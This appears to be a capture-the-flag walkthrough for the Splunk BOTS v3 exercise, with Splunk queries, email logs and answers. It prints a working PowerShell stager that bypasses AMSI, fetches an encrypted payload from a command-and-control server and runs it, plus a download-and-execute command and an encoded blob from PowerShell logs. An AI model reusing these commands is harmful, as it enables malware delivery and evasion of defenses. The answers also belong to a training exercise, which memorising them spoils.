COlLECTIONS.GenEriC.HASHSET[sTRinG]))}$ReF=[REF].ASsEMBLY.GeTTYpe('System.Management.Automation.AmsiUtils');$REf.GeTFiEld('amsiInitFailed','NonPublic,Static').SEtVaLuE($nULL,$trUE);};[SYsTEM.NeT.SERVIcEPoINTMaNaGER]::EXPeCt100COntinUE=0;$wC=New-OBJeCt SYsTeM.NEt.WebCLiENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$WC.HEAdeRs.AdD('User-Agent',$u);$Wc.HEadERs.Add('User-Agent',$u);$Wc.PRoXy=[SyStem.NET.WeBReqUESt]::DefaUlTWEbProXy;$WC.ProxY.CRedeNTiALs = [SYsTem.NEt.CreDeNTiALCacHe]::DefaUlTNEtWorkCrEdentiaLs;$Script:Proxy = $wc.Proxy;$K=[SYSTeM.TexT.EnCOdinG]::ASCII.GETBYTES('1AB<Yk6Z4#+vVu%o5}8&M-9UL~l|>0gP');$R={$D,$K=$ARgs;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CoUnt])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bXoR$S[($S[$I]+$S[$H])%256]}};$ser=$([Text.EncodIng]::UnIcODE.GEtSTrinG([ConvERt]::FroMBAse64StriNG('aAB0AHQAcABzADoALwAvADQANQAuADcANwAuADUAMwAuADEANwA2ADoANAA0ADMA')));$t='/admin/get.php';$WC.HEaDErS.AdD("Cookie","PthAVgs=hB2H0GTIpwxCeLhGe/fLkfBpCdI=");$daTA=$wC.DOWnloAdDAtA($sEr+$t);$iv=$dATA[0..3];$DaTa=$daTA[4..$Data.lENGTH];-joiN[ChAr[]](& $R $DaTa ($IV+$K))|IEX

https://45.77.53.176:443

colonel.c

so

colonel.c,definitelydontinvestigatethisfile.sh 
```

![[Pasted image 20230128221104.png]]


*colonel.c,definitelydontinvestigatethisfile.sh*

The Taedonggang adversary sent Grace Hoppy an email bragging about the successful exfiltration of customer data. How many Frothly customer emails were exposed or revealed?  

Use stream:smtp as the source type.

```json
index=botsv3 sourcetype=stream:smtp *grace hoppy* earliest=0 sourcetype!=ms:aad:signin

 { [-]
   attach_content_decoded_md5_hash: [ [-]
     807d17ca8c7f400be030ac992cec5b26
   ]
   attach_content_md5_hash: [ [-]
     e3f8a89a19d4b96592abcf02900037e2
   ]
   attach_disposition: [ [-]
     inline
   ]
   attach_filename: [ [-]
     1534778082419.png
   ]
   attach_size: [ [-]
     119666
   ]
   attach_size_decoded: [ [-]
     87446
   ]
   attach_transfer_encoding: [ [-]
     base64
   ]
   attach_type: [ [-]
     image/png
   ]
   bytes: 133287
   bytes_in: 133250
   bytes_out: 37
   content: [ [+]
   ]
   content_body: [ [-]
     --_004_MWHPR17MB124780ACE6F28E61609F84EABF2B0MWHPR17MB1247namp_

     --_000_MWHPR17MB124780ACE6F28E61609F84EABF2B0MWHPR17MB1247namp_

     Bud,

 Uh... WTF ?!?!?

Billy,
 Is this real?

Jeremiah,
 Are these our customers?

GH

________________________________
From: HyunKi Kim <hyunki1984@naver.com>
Sent: Thursday, July 26, 2018 12:08 PM
To: Grace Hoppy
Subject: All your datas belong to us


Gracie,

       We brought your data and imported it: https://pastebin.com/sdBUkwsE =
Also, you should not be too hard Bruce. He good man

[https://pastebin.com/i/facebook.png]<https://pastebin.com/sdBUkwsE>

( ) ) ) - Pastebin.com<https://pastebin.com/sdBUkwsE>
pastebin.com






[cid:795e1cc341020882f2e76352168cb@cweb10.nm.nhnsystem.com]





[https://mail.naver.com/readReceipt/notify/?img=3DMweG1rl9D62qhAndaAvwFq2wK=
rMZMrulF4MqK6FoMrpCKx2XKru9pxtwFxvZtzFXp6UZFSl5WLl51zlqDBFdp6d5MreRhoRN1zem=
bH0gpNiT%2Bz25WHv%3D.gif]

     <html>
<head>
<meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Diso-8859-=
1">
<style type=3D"text/css" style=3D"display:none;"><!-- P {margin-top:0;margi=
n-bottom:0;} --></style>
</head>
<body dir=3D"ltr">
<div id=3D"divtagdefaultwrapper" style=3D"font-size:12pt;color:#000000;font=
-family:Calibri,Helvetica,sans-serif;" dir=3D"ltr">
<p style=3D"margin-top:0;margin-bottom:0">Bud,</p>
<p style=3D"margin-top:0;margin-bottom:0">&nbsp;Uh... WTF ?!?!?</p>
<div><br>
</div>
Billy,
<div>&nbsp;Is this real?
<div><br>
</div>
<div>Jeremiah,</div>
<div>&nbsp;Are these our customers?<br>
<br>
GH</div>
<div><br>
<div style=3D"color: rgb(0, 0, 0);">
<hr style=3D"display:inline-block; width:98%" tabindex=3D"-1">
<div id=3D"divRplyFwdMsg" dir=3D"ltr"><font face=3D"Calibri, sans-serif" co=
lor=3D"#000000" style=3D"font-size:11pt"><b>From:</b> HyunKi Kim &lt;hyunki=
1984@naver.com&gt;<br>
<b>Sent:</b> Thursday, July 26, 2018 12:08 PM<br>
<b>To:</b> Grace Hoppy<br>
<b>Subject:</b> All your datas belong to us</font>
<div>&nbsp;</div>
</div>
<meta content=3D"text/html; charset=3Dutf-8">
<div>
<div style=3D"font-size:10pt; font-family:Gulim,sans-serif">
<p><span style=3D"color:rgb(34,34,34); font-family:arial,sans-serif; font-s=
ize:16px; background-color:rgb(245,245,245)">Gracie,</span><br style=3D"col=
or:rgb(34,34,34); font-family:arial,sans-serif; font-size:16px; background-=
color:rgb(245,245,245)">
<br style=3D"color:rgb(34,34,34); font-family:arial,sans-serif; font-size:1=
6px; background-color:rgb(245,245,245)">
<span style=3D"color:rgb(34,34,34); font-fa
     mily:arial,sans-serif; font-size=
:16px; background-color:rgb(245,245,245)">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;</span><span style=3D"color:rgb(34,34,34); font-family:arial,sans-serif;=
 font-size:16px; background-color:rgb(245,245,245)">&nbsp;</span><span clas=
s=3D"" style=3D"color:rgb(34,34,34); font-family:arial,sans-serif; font-siz=
e:16px; background-color:rgb(245,245,245)">We
 brought your data and imported it: <a href=3D"https://pastebin.com/sdBUkws=
E" id=3D"LPlnk635761" class=3D"OWAAutoLink" previewremoved=3D"true">
https://pastebin.com/sdBUkwsE</a> Also, you should not be too hard Bruce. H=
e good man</span></p>
<div id=3D"LPBorder_GT_15326322809890.XXXXXXXXXXXXXXXX" style=3D"margin-bot=
tom: 20px; overflow: auto; width: 100%; text-indent: 0px;">
<table id=3D"LPContainer_15326322809830.07321163773121564" role=3D"presenta=
tion" cellspacing=3D"0" style=3D"width: 90%; background-color: rgb(255, 255=
, 255); position: relative; overflow: auto; padding-top: 20px; padding-bott=
om: 20px; margin-top: 20px; border-top-width: 1px; border-top-style: dotted=
; border-top-color: rgb(200, 200, 200); border-bottom-width: 1px; border-bo=
ttom-style: dotted; border-bottom-color: rgb(200, 200, 200);">
<tbody>
<tr valign=3D"top" style=3D"border-spacing: 0px;">
<td id=3D"ImageCell_15326322809870.XXXXXXXXXXXXXXXX" colspan=3D"1" style=3D=
"width: 250px; position: relative; display: table-cell; padding-right: 20px=
;">
<d
     iv id=3D"LPImageContainer_15326322809870.6781247017589392" style=3D"backg=
round-color: rgb(255, 255, 255); height: 250px; position: relative; margin:=
 auto; display: table; width: 250px;">
<a id=3D"LPImageAnchor_15326322809880.838301279271155" href=3D"https://past=
ebin.com/sdBUkwsE" target=3D"_blank" style=3D"display: table-cell; text-ali=
gn: center;"><img id=3D"LPThumbnailImageID_15326322809880.7387261911733106"=
 width=3D"250" height=3D"250" style=3D"display: inline-block; max-width: 25=
0px; max-height: 250px; height: 250px; width: 250px; border-width: 0px; ver=
tical-align: bottom;" src=3D"https://pastebin.com/i/facebook.png"></a></div=
>
</td>
<td id=3D"TextCell_15326322809880.2115156491567124" colspan=3D"2" style=3D"=
vertical-align: top; position: relative; padding: 0px; display: table-cell;=
">
<div id=3D"LPRemovePreviewContainer_15326322809880.03290316719839892"></div=
>
<div id=3D"LPTitle_15326322809880.XXXXXXXXXXXXXXXX" style=3D"top: 0px; colo=
r: rgb(0, 120, 215); font-weight: normal; font-size: 21px; font-family: wf_=
segoe-ui_light, 'Segoe UI Light', 'Segoe WP Light', 'Segoe UI', 'Segoe WP',=
 Tahoma, Arial, sans-serif; line-height: 21px;">
<a id=3D"LPUrlAnchor_15326322809880.7830490905496" href=3D"https://pastebin=
..com/sdBUkwsE" target=3D"_blank" style=3D"text-decoration: none;">( ) ) ) -=
 Pastebin.com</a></div>
<div id=3D"LPMetadata_15326322809880.206449588839397" style=3D"margin: 10px=
 0p
     x 16px; color: rgb(102, 102, 102); font-weight: normal; font-family: wf_=
segoe-ui_normal, 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif; font-si=
ze: 14px; line-height: 14px;">
pastebin.com</div>
</td>
</tr>
</tbody>
</table>
</div>
<br>
&nbsp;
<p></p>
<p><span class=3D"" style=3D"color:rgb(34,34,34); font-family:arial,sans-se=
rif; font-size:16px; background-color:rgb(245,245,245)">&nbsp;</span></p>
<p><span class=3D"" style=3D"color:rgb(34,34,34); font-family:arial,sans-se=
rif; font-size:16px; background-color:rgb(245,245,245)"><img class=3D"x_NHN=
_MAIL_IMAGE" tabindex=3D"0" data-outlook-trace=3D"F:1|T:1" src=3D"cid:795e1=
cc341020882f2e76352168cb@cweb10.nm.nhnsystem.com">&nbsp;</span></p>
<p><span class=3D"" style=3D"color:rgb(34,34,34); font-family:arial,sans-se=
rif; font-size:16px; background-color:rgb(245,245,245)">&nbsp;</span></p>
<p><span class=3D"" style=3D"color:rgb(34,34,34); font-family:arial,sans-se=
rif; font-size:16px; background-color:rgb(245,245,245)">&nbsp;</span></p>
</div>
<table style=3D"display:none">
<tbody>
<tr>
<td><img border=3D"0" src=3D"https://mail.naver.com/readReceipt/notify/?img=
=3DMweG1rl9D62qhAndaAvwFq2wKrMZMrulF4MqK6FoMrpCKx2XKru9pxtwFxvZtzFXp6UZFSl5=
WLl51zlqDBFdp6d5MreRhoRN1zembH0gpNiT%2Bz25WHv%3D.gif"></td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</body>
</html>

    
--_004_MWHPR17MB124780ACE6F28E61609F84EABF2B0MWHPR17MB1247namp_

     .

   ]
   content_transfer_encoding: [ [+]
   ]
   content_type:  multipart/related;
	boundary="_004_MWHPR17MB124780ACE6F28E61609F84EABF2B0MWHPR17MB1247namp_";
	type="multipart/alternative"
   date: Fri, 14 Sep 2018 11:25:42 +0000
   dest_ip: 172.31.38.181
   dest_mac: 06:6A:51:FA:0A:B0
   dest_port: 25
   endtime: 2018-08-20T15:19:35.131703Z
   file_type: [ [+]
   ]
   flow_id: b064f780-d3a0-4841-a5bd-b07a4937d436
   mime_type: multipart/related
   mime_version:  1.0
   msg_id:
 <MWHPR17MB124780ACE6F28E61609F84EABF2B0@MWHPR17MB1247.namprd17.prod.outlook.com>
   protocol_stack: ip:tcp:smtp
   received_by_name: MWHPR17MB1247.namprd17.prod.outlook.com
   received_date: [ [-]
     Fri, 14 Sep 2018 11:25:42 +0000
     Thu, 26 Jul 201819:13:24 +0000
   ]
   received_from_name: MWHPR17MB1247.namprd17.prod.outlook.com
   received_server_agent: [fe80::74b3:5d25:4f24:72ba%3]
   received_with: mapi
   receiver: [ [-]
     Bud Stoll <bstoll@froth.ly>
     Billy Tun <btun@froth.ly>
     Jeremiah Wortoski <jwortoski@froth.ly>
   ]
   receiver_alias: [ [-]
     Bud Stoll
     Billy Tun
     Jeremiah Wortoski
   ]
   receiver_email: [ [-]
     bstoll@froth.ly
     btun@froth.ly
     jwortoski@froth.ly
   ]
   receiver_type: [ [-]
     TO
     CC
     CC
   ]
   reply_time: 4676
   request_time: 349994
   response_code: 250
   response_time: 0
   sender: Grace Hoppy <ghoppy@froth.ly>
   sender_alias: Grace Hoppy
   sender_email: ghoppy@froth.ly
   server_response: 250 2.0.0 Ok: queued as 6C7831794E8
   src_ip: 104.47.38.43
   src_mac: 06:E3:CC:18:AA:33
   src_port: 1920
   subject: Fw: All your datas belong to us
   time_taken: 354670
   timestamp: 2018-08-20T15:19:34.777033Z
   transport: tcp
} 

https://pastebin.com/sdBUkwsE


2.  ( ) ) )
    
3.  * ) ( )\ ) ( /( ( /( ( ( ( ( /( (
    
4.  ` ) /( )\ ( (()/( )\()) )\()) )\ ) )\ ) )\ )\()) )\ )
    
5.  ( )(_))((((_)( )\ /(_)) ((_)\ ((_)\ (()/( (()/( ((((_)( ((_)\ (()/(
    
6.  (_(_()) )\ _ )\ ((_)(_))_ ((_) _((_) /(_))_ /(_))_ )\ _ )\ _((_) /(_))_
    
7.  |_ _| (_)_\(_)| __|| \ / _ \ | \| |(_)) __|(_)) __|(_)_\(_)| \| |(_)) __|
    
8.  | | / _ \ | _| | |) || (_) || .` | | (_ | | (_ | / _ \ | .` | | (_ |
    
9.  |_| /_/ \_\ |___||___/ \___/ |_|\_| \___| \___|/_/ \_\ |_|\_| \___|
    

12.  Good morning. ghoppy@froth.ly we hacked you again. I hope your beer is better than your safety.
    

14.  'Meeting to discuss project plan and hash out the details of implementation',NULL,NULL,0),('c11f78ae-b124-931b-4cd7-5b44265760aa','lily@brokenhands.com','','rlait@converseloverscom','',''Looking for new craft beers',NULL,NULL,0),('c68c9a00-a56e-1ba3-a46e-5b44265bc081','JohnnyStoner@stoutlover.com','','DavidHerrald@basements.com','','','Needs a yeast that has the taste of candycorn',NULL,NULL,0),('cc0b352b-4708-b54f-a891-5b4426f12d47','tomsmit@mainecabanaboys.com','','mattyv@scootersafety.com,'','','Called about new brewery in St. Louis'',NULL,NULL,0),('d1d8ea88-90bd-ede3-7400-5b4426a1ce21','davidveuve@bellyandshouldershimmies.co.uk','','jimmybrodsky@firearmsandmortuaries.it','','','Very intersted in discussing floral notes of peat and dirt in scottish ale',NULL,NULL,0),('d767c134-0327-6f28-5a14-5b4426f95e21','

8 users

```

*8*

What is the path of the URL being accessed by the command and control server? Answer guidance: Provide the full path. (Example: The full path for the URL https://imgur.com/a/mAqgt4S/lasd3.jpg is /a/mAqgt4S/lasd3.jpg)  

Start with XmlWinEventLog:Microsoft-Windows-Sysmon/Operational as the source type, or review the PowerShell logging on various Frothly laptops.

```powershell
index=botsv3 earliest=0 source="WinEventLog:Microsoft-Windows-PowerShell/Operational"

index=botsv3 earliest=0 source="WinEventLog:Microsoft-Windows-PowerShell/Operational" Message!="PowerShell

index=botsv3 earliest=0 source="WinEventLog:Microsoft-Windows-PowerShell/Operational" Message!="PowerShell console*" Message="*/*"

or

08/20/2018 11:57:24 AM
LogName=microsoft-windows-powershell/operational
SourceName=Microsoft-Windows-PowerShell
EventCode=4104
EventType=3
Type=Warning
ComputerName=ABUNGST-L.froth.ly
User=NOT_TRANSLATED
Sid=S-1-12-1-3724665869-1333809698-159041953-828180297
SidType=0
TaskCategory=Execute a Remote Command
OpCode=On create calls
RecordNumber=323
Keywords=None
Message=Creating Scriptblock text (1 of 3):
# PowerShell + HTML5 prototype. Needs audio. Run: iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
if($host.Name -ne "ConsoleHost")
{
    Start-Process powershell -ArgumentList '-noprofile -noexit -command iex (New-Object Net.WebClient).DownloadString(''http://bit.ly/e0Mw9w'')'
    return
}

$data = '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